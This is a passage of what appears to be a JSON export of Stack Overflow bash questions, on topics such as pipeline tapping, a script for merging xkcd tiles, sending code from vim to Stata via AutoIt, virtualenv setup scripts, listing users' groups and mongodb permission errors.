${location}\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":85,"score":4,"question_id":11944534,"title":"Saving command output to bash-history","body":"<p>Does anyone know of a way to hack bash to intercept and save output for each command that it executes?</p>\n"},{"tags":["ruby","bash","shell","unix","pipeline"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":52,"score":4,"question_id":12545705,"title":"Idiomatic Analog to Ruby's `Object#tap` for Unix command Pipelines?","body":"<p>Is there an idiomatic analog to Ruby's <code>Object#tap</code> for Unix command pipelines?</p>\n\n<p>Use case: within a pipeline I want to execute a command for its side effects but return the input implicitly so as to not break the chaining of the pipeline. For example:</p>\n\n<pre><code>echo { 1, 2, 3 } |\n  tr ' ' '\\n' |\n  sort |\n  tap 'xargs echo' | # arbitrary code, but implicitly return the input\n  uniq\n</code></pre>\n\n<p>I'm coming from Ruby, where I would do this:</p>\n\n<pre><code>[ 1, 2, 3 ].\n  sort.\n  tap { |x| puts x }.\n  uniq\n</code></pre>\n"},{"tags":["bash","colors","terminal"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12545316,"title":"how shell detect if terminal support colors","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4233808/piping-data-to-linux-program-which-expects-a-tty-terminal\">Piping data to Linux program which expects a TTY (terminal)</a>  </p>\n</blockquote>\n\n\n\n<p>I want to display colors from script that is non interactive and I need to tell the shell that in fact my script is a terminal that support colors so command like ls <code>--color=auto</code> will display colors (ls have option <code>--color=always</code> but I would like to support for all posible commands that support colors as well).</p>\n\n<p>I call my shell via python Popen. I've try to set TERM environment variable but It don't work.</p>\n\n<pre><code>subprocess.Popen(['/bin/bash', '-c', command],\n                  env={'TERM':'xterm-color'},\n                  stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n</code></pre>\n\n<p>Is there a way to tell bash that I'm a terminal?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12533560,"title":"Is it possible to have a variable as a for loop expression?","body":"<p>I'm writing a script to merge the xkcd webcomic tiles for comic 1110. So far, I have written about 100 lines, and instead of doing each quadrant of the image separately, I've decided to use functions to do this, repeating for every quadrant and using variables for each quadrant to make the function act differently each time. I would like to be able to something like this, except do it with a different value for a each time.</p>\n\n<pre><code>a='((n=$north; n&gt;=1; n--))';\nfor ${a};\n    do \"echo Hello World!\"\ndone\n</code></pre>\n\n<p>My problem is, I'm having trouble using variables for the for loop expressions, it goes \"line 8: eval \"$a\"': not a valid identifier\", and if I try putting it in parentheses, it goes \"line 30: syntax error: arithmetic expression required\", and then \"line 30: syntax error: `((${a}))\". This is what I have so far. Before anyone answers, Yes, I know it has bugs.</p>\n\n<pre><code>#!/bin/bash\n# Date Created: September 20th, 2012\n# Created by Jonathan Bondhus - https://github.com/jbondhus\n# Credit to Andreas Reichinger for analysis of image tile placement, xkcd.com for comic. Used ImageMagick code from Antonio Frascarelli.\n#\n#  This script will merge the files from xkcd comic number 1110, \"Click and Drag\".\n\nfunction function_join() {\n    echo \"#\";\n    if [[ quadrant -eq 1 ]]; then\n    echo \"# First Quadrant:\"; # Join together the first quadrant\n    function_quadrant\n    else\n        if [[ quadrant -eq 2 ]]; then\n        echo \"# Second Quadrant:\"; # Join together the second quadrant\n        function_quadrant\n        else\n            if [[ quadrant -eq 3 ]]; then\n            echo \"# Third Quadrant:\"; # Join together the third quadrant\n            function_quadrant\n            else\n                if [[ quadrant -eq 4 ]]; then\n                echo \"# Fourth Quadrant:\"; # Join together the fourth quadrant\n                function_quadrant\n                fi\n            fi\n        fi\n    fi\n    echo \"#\";\n    for ${a};\n    do\n        echo \"# row number \"$n\" ...\";\n        convert $b;\n        for `eval \"$c\"`;\n        do\n            if [ $d ];      # If the tile file doesn't exist, an empty square will be used.\n                then convert $e;\n                else convert $f;\n            fi;\n        done;\n        convert $g;    # Append the image onto the current quadrant\n        rm -f $h;\n        echo \"# ... OK\";\n        echo \"#\";\n    done;\n}\n\nfunction function_quadrant() {\n    if [[ quadrant -eq 1 ]]; then # Set the variables for function_join\n    quadrantName=\"first\"\n    a='((n=$north; n&gt;=1)); n--'\n    b='-size 0x1 xc:white resultn$n''w.png'\n    c='((w=$west; w&gt;=1; w--))'\n    d='-e $n''n$w''w.png'\n    e='+append resultn$n''w.png $n''n$w''w.png resultn$n''w.png'\n    f='+append resultn$n''w.png _blank.png resultn$n''w.png'\n    g='-append ${quadrantName}Quadrant.png resultn$n''w.png ${quadrantName}Quadrant.png'\n    h='resultn$n''w.png'\n    else\n        if [[ quadrant -eq 2 ]]; then\n        quadrantName=\"second\"\n        a='n=$north; n&gt;=1; n--'\n        b='-size 0x1 xc:white resultn$n''e.png'\n        c='e=$east; e&lt;=20; e++'\n        d='-e $n''n$e''e.png'\n        e='+append resultn$n''e.png $n''n$e''e.png resultn$n''e.png'\n        f='+append resultn$n''e.png _blank.png resultn$n''e.png'\n        g='-append ${quadrantName}Quadrant.png resultn$n''e.png ${quadrantName}Quadrant.png'\n        h='resultn$n''e.png'\n        else\n            if [[ quadrant -eq 3 ]]; then\n            quadrantName=\"third\"\n            a='s=1; s&lt;=$south; s++'\n            b='-size 0x1 xc:black results$s''w.png'\n            c='w=$west; w&gt;=1; w--'\n            d='-e $s''s$w''w.png'\n            e='+append results$s''w.png $s''s$w''w.png results$s''w.png'\n            f='+append results$s''w.png _black.png results$s''w.png'\n            g='-append ${quadrantName}Quadrant.png results$s''w.png ${quadrantName}Quadrant.png'\n            h='results$s''w.png'\n            else\n                if [[ quadrant -eq 4 ]]; then\n                quadrantName=\"fourth\"\n                a='s=1; s&lt;=$south; s++'\n                b='-size 0x1 xc:black results$s''e.png'\n                c='e=1; e&lt;=20; e++'\n                d='-e $s''s$e''e.png'\n                e='+append results$s''e.png $s''s$e''e.png results$s''e.png'\n                f='+append results$s''e.png _black.png results$s''e.png'\n                g='-append ${quadrantName}Quadrant.png results$s''e.png ${quadrantName}Quadrant.png'\n                h='results$s''e1.png'\n                else # If more than 4 quadrants, just to be safe, exit\n                    exit 1\n                fi\n            fi\n        fi\n    fi\n}\n\nfor (( quadrant = 0; quadrant &lt; 4; quadrant++ )); do\n    function_join\ndone\n\necho \"#################################\"\necho \"Joining completed!\"\necho \"#################################\"\n\nexit 0\n</code></pre>\n"},{"tags":["linux","bash","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":55,"score":2,"question_id":12541713,"title":"Exclude specific dir from $PATH","body":"<p>I've multiple MPI variations on my system. Each one is used for compile of specific application. I am looking for an script to exclude specific dir from $PATH to wrap application execution with the corresponding MPI. Is there any simple way to do so?</p>\n"},{"tags":["bash","cut","io-redirection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12544429,"title":"bash input/output redirect doesn't work","body":"<p>Can anybody tell me what is wrong with the following bash code</p>\n\n<pre><code>for f in $FILES\ndo\n  cut -d, f1-7 &lt; $f &gt; $f.tmp\ndone\n</code></pre>\n\n<p>When I run in the loop</p>\n\n<pre><code>echo \"cut -d, f1-7 &lt; $f &gt; $f.tmp\"\n</code></pre>\n\n<p>I get the right command output and when I run that command by itself, it works perfectly. But when I run it in the bash loop, it doesn't work, I get the following error:</p>\n\n<pre><code>cut: you must specify a list of bytes, characters, or fields\nTry `cut --help' for more information.\n</code></pre>\n\n<p>Any ideas?</p>\n"},{"tags":["python","bash","vim","autoit","stata"],"answer_count":3,"favorite_count":4,"up_vote_count":17,"down_vote_count":0,"view_count":729,"score":17,"question_id":7038701,"title":"send code from vim to an external application for execution","body":"<p>I am regularly using stata at work. My text editor of choice is (g)vim.\nI have been using the scripts provided <a href=\"https://code.google.com/p/notepad-stats-integration/\" rel=\"nofollow\">here</a> or <a href=\"http://huebler.blogspot.com/2008/04/stata.html\" rel=\"nofollow\">here</a> to send code from vim to stata. This functionality is immensely practical and virtually the only thing the keeps me from switching to linux completely. The scripts are written in AutoIT, so I cannot use them in linux. They are also basically independent from the choice of text editor, the people who wrote them are using notepad++.</p>\n\n<p>Essentially, these scripts together with a few lines in my vimrc allow me to send selections or the whole file to a running stata window (if none is open, stata is started first). </p>\n\n<p>I am looking for a solution that does this in linux, but I have no idea where to start. In linux there are two different stata versions, stata for the command line and xstata is the gui version. I need to use the gui version as the functionality of the command line version is limited unfortunately, so screen/tmux are ruled out. </p>\n\n<p>If this is trivial, I'm really sorry for missing it and would be immensely grateful for a solution. I also wasn't able to find an existing plugin for vim I could utilize. If not, I am willing to invest some time and figure out how to implement a solution. A pointer in the right direction would however be quite helpful. I am relatively new to linux and programming in general, but willing to learn. </p>\n\n<p>Regarding tools: I don't know bash, but it is something I want to look into anyways at some point. I have dabbled a bit in python, so that would also be ok. In case there is anything else absolutely superior for this task, please let me know.  </p>\n\n<p>Any help is greatly appreciated. The AutoIT scripts are hosted on the website, but I can post my windows setup here if necessary.</p>\n\n<p>EDIT</p>\n\n<p>Ok, after some debate in the comments, here is the essential AutoIT script that I need to translate. (I would prefer a solution that doesn't overwrite the content of the system clipboard each time though.)</p>\n\n<p>Edit2 \nI guess this is what the script does essentially: It checks for an open stata window, selects it (or executes one), pastes the contents that are to be executed into a temporary file, switches to the stata window, selects the command line with ctrl-1 (and anything that might already be written there with ctrl-a) and then pastes do \"tempfile\" into the commandline, which then executes the code that was sent. At least that is how I understand it.</p>\n\n<p>FINAL COMMENT</p>\n\n<p>I have worked up a solution in bash some time ago, it is posted <a href=\"http://stackoverflow.com/questions/4226145/sending-code-from-vim-to-stata\">here</a> as an answer to a previous version of this question.</p>\n\n<pre><code>; Declare variables\nGlobal $ini, $statapath, $statawin, $statacmd, $dofile, $clippause, $winpause, $keypause\n\n; File locations\n; Path to INI file\n$ini = @ScriptDir &amp; \"\\rundo.ini\"\n;; contents of ini file are the following\n    ;[Stata]\n    ;; Path to Stata executable\n    ;statapath = \"C:\\Program Files\\Stata11\\StataSE.exe\"\n    ;; Title of Stata window\n    ;statawin = \"Stata/SE 11.2\"\n    ;; Keyboard shortcut for Stata command window\n    ;statacmd = \"^1\"\n    ;[Delays]\n    ;; Pause after copying of Stata commands to clipboard, in milliseconds\n    ;; Use higher number if script fails (default: 100, recommended range: 0 - 200)\n    ;clippause = 100\n    ;; Pause between window-related operations, in milliseconds\n    ;; Use lower number to speed up script, higher number if script fails (default: 200)\n    ;winpause = 200\n    ;; Pause between key strokes sent to Stata, in milliseconds\n    ;; Use lower number to speed up script, higher number if script fails (default: 1)\n    ;keypause = 1\n\n\n; Path to Stata executable\n$statapath = IniRead($ini, \"Stata\", \"statapath\", \"C:\\Program Files\\Stata11\\StataSE.exe\")\n; Title of Stata window\n$statawin = IniRead($ini, \"Stata\", \"statawin\", \"Stata/SE 11.2\")\n\n; Keyboard shortcut for Stata command window\n$statacmd = IniRead($ini, \"Stata\", \"statacmd\", \"^1\")\n\n; Path to do-file that is passed to AutoIt\n; Edit line to match editor used, if necessary\n$dofile = $CmdLine[1]\n\n; Delays\n; Pause after copying of Stata commands to clipboard\n$clippause = IniRead($ini, \"Delays\", \"clippause\", \"100\")\n; Pause between window-related operations\n$winpause = IniRead($ini, \"Delays\", \"winpause\", \"200\")\n; Pause between keystrokes sent to Stata\n$keypause = IniRead($ini, \"Delays\", \"keypause\", \"1\")\n\n; Set WinWaitDelay and SendKeyDelay to speed up or slow down script\nOpt(\"WinWaitDelay\", $winpause)\nOpt(\"SendKeyDelay\", $keypause)\n\n; If more than one Stata window is open, the window that was most recently active will be matched\nOpt(\"WinTitleMatchMode\", 2)\n\n; Check if Stata is already open, start Stata if not\nIf WinExists($statawin) Then\n  WinActivate($statawin)\n  WinWaitActive($statawin)\n  ; Activate Stata command window and select text (if any)\n  Send($statacmd)\n  Send(\"^a\")\n  ; Run saved do-file\n  ; Double quotes around $dofile needed in case path contains blanks\n  ClipPut(\"do \" &amp; '\"' &amp; $dofile &amp; '\"')\n  ; Pause avoids problem with clipboard, may be AutoIt or Windows bug\n  Sleep($clippause)\n  Send(\"^v\" &amp; \"{Enter}\")\nElse\n  Run($statapath)\n  WinWaitActive($statawin)\n  ; Activate Stata command window\n  Send($statacmd)\n  ; Run saved do-file\n  ; Double quotes around $dofile needed in case path contains blanks\n  ClipPut(\"do \" &amp; '\"' &amp; $dofile &amp; '\"')\n  ; Pause avoids problem with clipboard, may be AutoIt or Windows bug\n  Sleep($clippause)\n  Send(\"^v\" &amp; \"{Enter}\")\nEndIf\n</code></pre>\n"},{"tags":["python","linux","bash","vim","stata"],"answer_count":4,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":676,"score":7,"question_id":4226145,"title":"sending code from vim to stata","body":"<p>I have been using Vim to write Stata scripts in Windows for a while now at the university. I am learning R at the moment, and I want to switch completely to Linux as my OS (I've recently switched to Ubuntu on my laptop). R works fine with Vim in both Windows and Linux, however I still need to use Stata sometimes. In Windows I have been using a simple AutoIt script provided by a Stata user to send lines / the whole file to stata for evaluation. This script doesnt work in Linux. </p>\n\n<p>This is what the script looks like</p>\n\n<pre><code>; AutoIt v3 script to run a Stata do-file from an external text editor\n; Version 3.1, Friedrich Huebler, fhuebler@gmail.com, www.huebler.info, 30 March 2009\n\n; Declare variables\nGlobal $ini, $statapath, $statawin, $dofile, $winpause, $keypause, $clippause\n\n; File locations\n; Path to INI file\n$ini = @ScriptDir &amp; \"\\rundo.ini\"\n; Path to Stata executable\n$statapath = IniRead($ini, \"Stata\", \"statapath\", \"C:\\Program Files\\Stata10\\wsestata.exe\")\n; Title of Stata window\n$statawin = IniRead($ini, \"Stata\", \"statawin\", \"Stata/SE 10.1\")\n\n; Path to do-file that is passed to AutoIt\n; Edit line to match editor used, if necessary\n$dofile = $CmdLine[1]\n\n; Delays\n; Pause after copying of Stata commands to clipboard\n$clippause = IniRead($ini, \"Delays\", \"clippause\", \"100\")\n; Pause between window-related operations\n$winpause = IniRead($ini, \"Delays\", \"winpause\", \"200\")\n; Pause between keystrokes sent to Stata\n$keypause = IniRead($ini, \"Delays\", \"keypause\", \"1\")\n\n; Set SendKeyDelay and WinWaitDelay to speed up or slow down script\nOpt(\"WinWaitDelay\", $winpause)\nOpt(\"SendKeyDelay\", $keypause)\n\n; If more than one Stata window is open, the window \n; that was most recently active will be matched\nOpt(\"WinTitleMatchMode\", 2)\n\n; Check if Stata is already open, start Stata if not\nIf WinExists($statawin) Then\n  WinActivate($statawin)\n  WinWaitActive($statawin)\n  ; Activate Stata Command Window and select text (if any)\n  Send(\"^4\")\n  Send(\"^a\")\n  ; Run saved do-file\n  ; Double quotes around $dofile needed in case path contains blanks\n  ClipPut(\"do \" &amp; '\"' &amp; $dofile &amp; '\"')\n  ; Pause avoids problem with clipboard, may be AutoIt or Windows bug\n  Sleep($clippause)\n  Send(\"^v\" &amp; \"{Enter}\")\nElse\n  Run($statapath)\n  WinWaitActive($statawin)\n  ; Activate Stata Command Window\n  Send(\"^4\")\n  ; Run saved do-file\n  ; Double quotes around $dofile needed in case path contains blanks\n  ClipPut(\"do \" &amp; '\"' &amp; $dofile &amp; '\"')\n  ; Pause avoids problem with clipboard, may be AutoIt or Windows bug\n  Sleep($clippause)\n  Send(\"^v\" &amp; \"{Enter}\")\nEndIf\n\n; End of script\n</code></pre>\n\n<p>with the following in my vimrc</p>\n\n<pre><code>\" STATA DO-FILE SCRIPTS\n\nfun! RunIt()\n  w\n  !start \"C:\\Programme\\Stata10\\integvim\\rundo3\\rundo.exe\" \"%:p\"\nendfun\nmap &lt;F8&gt; :&lt;C-U&gt;call RunIt()&lt;CR&gt;&lt;CR&gt;\nimap &lt;F8&gt; &lt;Esc&gt;:&lt;C-U&gt;call RunIt()&lt;CR&gt;&lt;CR&gt;\n\nfun! RunDoLines()\n  let selectedLines = getbufline('%', line(\"'&lt;\"), line(\"'&gt;\"))\n if col(\"'&gt;\") &lt; strlen(getline(line(\"'&gt;\")))\n  let selectedLines[-1] = strpart(selectedLines[-1], 0, col(\"'&gt;\"))\n  endif\n if col(\"'&lt;\") != 1\n  let selectedLines[0] = strpart(selectedLines[0], col(\"'&lt;\")-1)\n  endif\n let temp = tempname() . \".do\"\n  call writefile(selectedLines, temp)\n    exec \"!start C:\\\\Programme\\\\Stata10\\\\integvim\\\\rundo3\\\\rundo.exe \" . temp\n    au VimLeave * exe \"!del -y\" temp\nendfun\nmap &lt;F9&gt; :&lt;C-U&gt;call RunDoLines()&lt;CR&gt;&lt;CR&gt; \nimap &lt;F9&gt; &lt;Esc&gt;:&lt;C-U&gt;call RunDoLines()&lt;CR&gt;&lt;CR&gt; \n</code></pre>\n\n<p>This is really practical and virtually the only reason I'm still sticking to Windows. How would I go about getting something like that for Ubuntu? I'm new to linux, and dont really know much about programming besides statistics. Any help is greatly appreciated. \n(Please dont suggest emacs, emacs support for stata is faulty, and though its integration with R is much better, I would like to keep using Vim for now.)</p>\n\n<p>On a possibly related topic: I'm considering learning Python, as I'll probably be working with data and doing empirical analysis for a longer time, and I think it might be useful for some tasks, e.g. to solve problems like this or parsing data from websites. Is this recommended, or should I look at another language (or forget the idea completely)?</p>\n"},{"tags":["regex","bash","shell","unix"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":112,"score":3,"question_id":11491397,"title":"Bash - CD into Untared directory with variable URL","body":"<p>This is the situation. I have a list of URLs that I need to extract and setup. Its all variable driven, but after I extract, I dont know what my folder will be called. I cant CD into it if I dont know what its called.</p>\n\n<pre><code>$DL_DIR = /opt/\n$URL = http://nginx.org/download/nginx-1.3.3.tar.gz\n$FILE=${URL##*/}\n$CONFIG = \"-- core\"\n\ncd \"$DL_DIR\"\nwget $URL\ntar xzf $FILE\ncd &lt;HOW DO I GO INTO IT?&gt;\n./configure \"$CONFIG\"\nmake\nmake install\nrm $FILE\n</code></pre>\n\n<p>If this doesnt explain it please say. I really want to get past this problem but Im having a hard time explaining it.</p>\n\n<p>Since I want this to function for any set of URL's which may have two formats like \".tar.gz\" or one format \".zip\" and may have .'s in the filename like \"Python2.3.4\" or may not \"Nginx\", it makes it a bit tricky.</p>\n"},{"tags":["bash","ubuntu","virtualenv","pip","virtualenvwrapper"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12542670,"title":"How to pip install into a virtualenv via a bash install script?","body":"<p>I recently tried to automate the setup of an Ubuntu VM with a bash script (I am new to bash scripting).</p>\n\n<p>The issue is that the way I set it up, it doesn't work. Particularly the mkvirtualenv and workon commands don't work in the bash script. How do I create a virtualenv in a bash script with passing it a variable and then install into the virtualenv via pip?</p>\n\n<pre><code>#!/bin/bash\nVENV_NAME='name_of_virtualenv'\n\n#Setting up virtualenv\nmkdir --mode=770 /var/virtualenvs\nchown -R www-data:www-edit /var/virtualenvs\nchmod 771 /var/virtualenvs\necho '# virtualenv and virtualwrapper' &gt;&gt; ~/.bashrc\necho '  export VIRTUALENV_USE_DISTRIBUTE=1'  &gt;&gt; ~/.bashrc # &lt;-- Always use pip/distribute\necho '  export WORKON_HOME=/var/virtualenvs'  &gt;&gt; ~/.bashrc\necho '  source /usr/local/bin/virtualenvwrapper.sh'  &gt;&gt; ~/.bashrc\necho '  export PIP_VIRTUALENV_BASE=$WORKON_HOME'  &gt;&gt; ~/.bashrc\necho '  export PIP_RESPECT_VIRTUALENV=true'  &gt;&gt; ~/.bashrc\nsource ~/.bashrc\n\nmkvirtualenv --distribute '{VENV_NAME}'\nworkon {VENV_NAME}\n\npip install psycopg2\npip install --upgrade PIL\n</code></pre>\n"},{"tags":["bash","pdf","imagemagick"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12421515,"title":"ImageMagick: Is it possible to remove \"Crop marks\"?","body":"<p>I'm using ImageMagick to create a a thumb of a PDF.</p>\n\n<pre><code>/opt/local/bin/convert \\\n   \"$inputFile[0]\"     \\\n  -geometry 157x200    \\\n  -colorspace RGB      \\\n   \"$ThumbFile\"\n</code></pre>\n\n<p>But lastly we got PDF with \"crop marks\" (for bleeding).</p>\n\n<p>Is there an option that I can use to don't take those?</p>\n\n<p>How can I do this? </p>\n\n<p><strong>Example:</strong></p>\n\n<p><img src=\"http://i.stack.imgur.com/rLLnv.gif\" alt=\"enter image description here\"></p>\n\n<p>I would like to have only the content of the second image.</p>\n"},{"tags":["bash","command-line","io-redirection"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":549,"score":-5,"question_id":11279335,"title":"Bash write to file without echo?","body":"<p>As an exercise, does a method exist to redirect a string to a file without echo? Currently I am using</p>\n\n<pre><code>echo \"Hello world\" &gt; test.txt\n</code></pre>\n\n<p>I know about <code>cat</code> and <code>printf</code>. I was thinking something like</p>\n\n<pre><code>&gt; test.txt &lt;&lt;&lt;\"Hello world\"\n</code></pre>\n\n<p>Of course this doesnt work, but maybe a similar command?</p>\n"},{"tags":["django","bash","unix","networking","ip-address"],"answer_count":9,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":7385,"score":4,"question_id":845694,"title":"How do I find my computer's IP address using the bash shell?","body":"<p>Every now and again, I need to start the Django development server, and have it viewable by other machines on my network, as described here:</p>\n\n<p><a href=\"http://docs.djangoproject.com/en/dev/ref/django-admin/#runserver\" rel=\"nofollow\">http://docs.djangoproject.com/en/dev/ref/django-admin/#runserver</a></p>\n\n<p>My machine’s IP address tends to change every now and again, so I’d like to have a little shell alias or something that spits out the manage.py command with my machine’s current IP address, maybe like this:</p>\n\n<pre><code>python manage.py runserver $(COMMAND TO FIND MY MACHINE’S IP ADDRESS GOES HERE):8000\n</code></pre>\n"},{"tags":["python","bash","jmeter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12537067,"title":"Starting and stopping server script","body":"<p>I've been building a performance test suite to exercise a server. Right now I run this by hand but I want to automate it. On the target server I run a python script that logs server metrics and halts when I hit enter. On the tester machine I run a bash script that iterates over JMeter tests, setting timestamps and naming logs and executing the tests. </p>\n\n<p>I want to tie these together so that the bash script drives the whole process, but I am not sure how best to do this. I can start my python script via ssh, but how to halt it when a test is done? If I can do it in ssh then I don't need to mess with existing configuration and that is a big win. The python script is quite simple and I don't mind rewriting it if that helps.</p>\n"},{"tags":["bash","ubuntu","tty"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":285,"score":0,"question_id":11339883,"title":"Run bash script on tty automatically","body":"<p>under <em>Ubuntu 12.04 server</em> I would like to run a bash-script (basically a <code>dialog</code>-based frontend to some system-settings scripts) automatically on <code>tty1</code>. My users mostly run the linux boxes completely headless, but sometimes we need to diagnose things and thus they'd simply have to attach monitor and keyboard and chose the correct option from the list.</p>\n\n<p>Simply adding the script to <code>/etc/init/tty1.conf</code> instead of the <code>getty</code> does not run the script.</p>\n\n<p>The possible option of using <code>mingetty --autologin (...)</code> and starting the script via <code>.bashrc</code> is a bit cumbersome and somehow not elegant (IMHO).</p>\n\n<p>Any ideas would, as always, be highly appreciated. Thanks!</p>\n"},{"tags":["bash","node.js"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12539969,"title":"Is it possible to get the output of a bash shell command as a string in node.js?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7464036/node-js-shell-script-and-arguments\">Node.js Shell Script And Arguments</a>  </p>\n</blockquote>\n\n\n\n<p>I'd like to get the output of a shell command as a string in node.js, but I'm not exactly sure where to start.  An example of such a command is the bash command \"ls\", which lists the contents of the current folder, and prints the results in the terminal window. Is it possible to convert this output to a Javascript string?</p>\n"},{"tags":["linux","bash","shell","terminal","command"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12540310,"title":"reading a variable that is a command in the terminal","body":"<p>Im doing this that works fine</p>\n\n<pre><code>utnso@utnso-vm:~$ read command\nps -fea\nutnso@utnso-vm:~$ $command\nUID        PID  PPID  C STIME TTY          TIME CMD\nroot         1     0  0 23:34 ?        00:00:02 /sbin/init\nroot         2     0  0 23:34 ?        00:00:00 [kthreadd]\nroot         3     2  0 23:34 ?        00:00:00 [ksoftirqd/0]\n...\n</code></pre>\n\n<p>But when trying to run this command it fails...</p>\n\n<pre><code>utnso@utnso-vm:~$ read command\nps -fea | grep bash\nutnso@utnso-vm:~$ $command\nERROR: Garbage option.\n********* simple selection *********  ********* selection by list *********\n-A all processes                      -C by command name\n-N negate selection                   -G by real group ID (supports names)\n-a all w/ tty except session leaders  -U by real user ID (supports names)\n-d all except session leaders         -g by session OR by effective group name\n-e all processes                      -p by process ID\nT  all processes on this terminal     -s processes in the sessions given\n\n\n   ...\n    ...\n    ...\n    ...\n                        ********* misc options *********\n-V,V  show version      L  list format codes  f  ASCII art forest\n-m,m,-L,-T,H  threads   S  children in sum    -y change -l format\n-M,Z  security data     c  true command name  -c scheduling class\n-w,w  wide output       n  numeric WCHAN,UID  -H process hierarchy\n</code></pre>\n\n<p>Does anybody know whats going on??</p>\n\n<p>Thanx in advanced!</p>\n"},{"tags":["python","linux","bash","shell","awk"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12540512,"title":"How to fill a file with custom values","body":"<p>I need to fill a file with some custom values. Something like </p>\n\n<pre><code>id marks\n1  24\n2  34\n</code></pre>\n\n<p>which scripting language is the best to do that. I need to fill the marks using some function and id is an increasing one.</p>\n\n<p>I know awk. Whether awk could do that?</p>\n"},{"tags":["linux","bash","shell","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":211,"score":0,"question_id":12539272,"title":"Grep /etc/passwd and /etc/group to list all users and each group the user belongs to","body":"<p>I'm trying to <code>grep</code> <code>/etc/passwd</code> and <code>/etc/group</code> to list ALL users and each group the user belongs to.</p>\n\n<p>IE: </p>\n\n<pre><code>Jon Doe, root:randomgroup:randomgroup2:randomgroup3\nBilly Bob, admin:apache:backups\nTimmy Tim, root:www\n</code></pre>\n\n<p>Anyhow, this is what I have so far but I'm not entirely sure how to get it to grep groups and match on the user field.</p>\n\n<pre><code>cat /etc/passwd | cut -d: -f1,5\n</code></pre>\n\n<p>This only displays the user with a \":\" and the Full Name </p>\n\n<p>How would I go about doing this?</p>\n"},{"tags":["bash","mongodb","node.js"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":734,"score":0,"question_id":8220236,"title":"mongodb installation Fail","body":"<p>I needed to learn node.js and mongodb which requires me to use my mac osx, so I am new to the shell command line interface. </p>\n\n<p><strong>Problem:</strong> When I followed the instructs on mongodb website and installed mongodb and tried to run, I get the following error messages. Any idea what went wrong?</p>\n\n<p><strong>What I Did:</strong></p>\n\n<ol>\n<li><code>brew install mongodb</code></li>\n<li><code>sudo mkdir -p /data/db</code></li>\n<li><code>sudo chmod 0755 /data/db</code></li>\n<li><code>sudo chown mongod:mongod /data/db</code></li>\n</ol>\n\n<p><strong>Error:</strong> <code>chown: mongod: Invalid argument</code></p>\n\n<p><strong>What I Did Next:</strong></p>\n\n<ol>\n<li><code>mongod</code></li>\n</ol>\n\n<p><strong>Error:</strong> </p>\n\n<pre><code>Mon Nov 21 18:55:08 [initandlisten] MongoDB starting : pid=28304 port=27017 dbpath=/data/db/ 64-bit host=MacBook-Air.local\nMon Nov 21 18:55:08 [initandlisten] db version v2.0.1, pdfile version 4.5\nMon Nov 21 18:55:08 [initandlisten] git version: 3a5cf0e2134a830d38d2d1aae7e88cac31bdd684\nMon Nov 21 18:55:08 [initandlisten] build info: Darwin erh2.10gen.cc 9.6.0 Darwin Kernel Version 9.6.0: Mon Nov 24 17:37:00 PST 2008; root:xnu-1228.9.59~1/RELEASE_I386 i386 BOOST_LIB_VERSION=1_40\nMon Nov 21 18:55:08 [initandlisten] options: {}\nMon Nov 21 18:55:08 [initandlisten] exception in initAndListen: 10309 Unable to create/open lock file: /data/db/mongod.lock errno:13 Permission denied Is a mongod instance already running?, terminating\nMon Nov 21 18:55:08 dbexit: \nMon Nov 21 18:55:08 [initandlisten] shutdown: going to close listening sockets...\nMon Nov 21 18:55:08 [initandlisten] shutdown: going to flush diaglog...\nMon Nov 21 18:55:08 [initandlisten] shutdown: going to close sockets...\nMon Nov 21 18:55:08 [initandlisten] shutdown: waiting for fs preallocator...\nMon Nov 21 18:55:08 [initandlisten] shutdown: lock for final commit...\nMon Nov 21 18:55:08 [initandlisten] shutdown: final commit...\nMon Nov 21 18:55:08 [initandlisten] shutdown: closing all files...\nMon Nov 21 18:55:08 [initandlisten] closeAllFiles() finished\nMon Nov 21 18:55:08 [initandlisten] shutdown: removing fs lock...\nMon Nov 21 18:55:08 [initandlisten] couldn't remove fs lock errno:9 Bad file descriptor\nMon Nov 21 18:55:08 dbexit: really exiting now\n</code></pre>\n\n<p>Doing a <code>ls -ld /data/db</code> gives:</p>\n\n<pre><code>drwxr-xr-x  2 root  wheel  68 Nov 21 18:46 /data/db\n</code></pre>\n"},{"tags":["osx","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12535704,"title":"Mac Bash doesn't seem to have skip-completed-text variable","body":"<p>While Googling for another bash tip, I found this page on .inputrc <a href=\"http://ss64.com/bash/syntax-inputrc.html\" rel=\"nofollow\">http://ss64.com/bash/syntax-inputrc.html</a>, which exactly fixed what I was 